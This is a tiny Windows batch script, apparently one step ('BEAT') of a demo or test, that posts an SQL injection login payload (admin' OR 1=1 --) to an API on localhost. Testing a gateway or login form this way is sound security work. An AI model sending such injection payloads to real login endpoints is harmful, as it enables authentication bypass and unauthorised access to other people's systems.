@echo off
rem BEAT: SQL injection attack (local gateway)
curl.exe -s -X POST http://localhost:8888/api/login -H "Content-Type: application/json" -d "{\"username\":\"admin' OR 1=1 --\",\"password\":\"x\"}"
echo.
